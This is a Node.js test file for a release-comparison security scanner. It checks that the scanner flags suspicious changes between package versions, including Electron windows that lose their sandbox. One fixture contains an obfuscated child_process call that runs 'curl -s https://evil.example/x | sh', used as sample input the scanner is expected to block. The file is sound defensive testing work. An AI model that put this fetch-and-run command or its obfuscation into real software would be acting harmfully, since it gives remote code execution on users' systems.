// Runs the public CLI on small releases each test writes, for semantics
// that need REA's real output: process calls REA did and did not classify,
// and which BrowserWindow a load call belongs to.
import assert from "node:assert/strict";
import { after, describe, it } from "node:test";

import { releases, run, skip } from "./cli-run.mjs";

const written = releases();
after(() => written.cleanup());

// Compares two releases written from `{ path: text }` maps.
const compare = (before, after, pkg = {}) => {
  const result = run(
    written.write("1.0.0", before, pkg),
    written.write("1.1.0", after, pkg),
  );
  written.keep(result.out);
  return result;
};

describe(
  "compare: process calls REA did and did not classify",
  { skip },
  () => {
    it("does not report the classified call's API as a coverage gap", () => {
      const spawnModule =
        'import { spawn } from "node:child_process";\nexport function backup() {\n  return spawn("/usr/bin/rsync", ["-a", "/var/notes", "/backup"]);\n}\n';
      const { result, report } = compare(
        { "index.js": spawnModule },
        { "index.js": `// Back up notes before upgrade.\n${spawnModule}` },
        { type: "module", main: "index.js" },
      );
      assert.equal(result.status, 0, result.stderr);
      assert.deepEqual(report.findings, []);
    });

    it("blocks a call through a computed child_process member as unexamined", () => {
      const { result, report } = compare(
        {
          "index.js":
            'const { spawn } = require("node:child_process");\nfunction backup() {\n  return spawn("/usr/bin/rsync", ["-a", "/var/notes", "/backup"]);\n}\nmodule.exports = { backup };\n',
        },
        {
          "index.js":
            'const cp = require("node:child_process");\nconst method = "exec" + "Sync";\nfunction backup() {\n  cp[method]("curl -s https://evil.example/x | sh");\n}\nmodule.exports = { backup };\n',
        },
        { main: "index.js" },
      );
      assert.equal(result.status, 2, result.stderr);
      const [finding] = report.findings;
      assert.deepEqual([finding.rule, finding.severity], ["RW-C01", "high"]);
      assert.ok(
        finding.evidence.some(
          (item) =>
            item.location?.line === 4 &&
            /computed member name index\.js calls on cp \(cp is imported from child_process\)/.test(
              item.claim,
            ),
        ),
        JSON.stringify(finding.evidence),
      );
    });
  },
);

describe("compare: which window a load call belongs to", { skip }, () => {
  const electron = 'const { app, BrowserWindow } = require("electron");\n';
  const options = (sandbox) =>
    `{ webPreferences: { contextIsolation: true, sandbox: ${sandbox} } }`;
  // The window that loads the remote app loses its sandbox; a new splash
  // window takes the sandboxed options it had.
  const regression = (window, prelude = "") =>
    compare(
      {
        "main.js": `${electron}${prelude}${window(options(true), 'loadURL("https://app.acme.example/")')}${window(options(false), 'loadFile("legacy.html")')}`,
      },
      {
        "main.js": `${electron}${prelude}${window(options(true), 'loadFile("splash.html")')}${window(options(false), 'loadURL("https://app.acme.example/")')}${window(options(true), 'loadFile("legacy.html")')}`,
      },
      { main: "main.js" },
    );
  const sandboxLost = ({ result, report }) => {
    assert.equal(result.status, 2, result.stderr);
    assert.deepEqual(
      report.findings.map((finding) => [finding.rule, finding.severity]),
      [["RW-E02", "high"]],
    );
  };

  it("pairs a window by what a call on its constructor loads", () => {
    sandboxLost(
      regression(
        (settings, load) => `new BrowserWindow(${settings}).${load};\n`,
      ),
    );
  });

  it("pairs windows one variable holds in turn by the calls after each assignment", () => {
    sandboxLost(
      regression(
        (settings, load) =>
          `win = new BrowserWindow(${settings});\nwin.${load};\n`,
        "let win;\n",
      ),
    );
  });
});
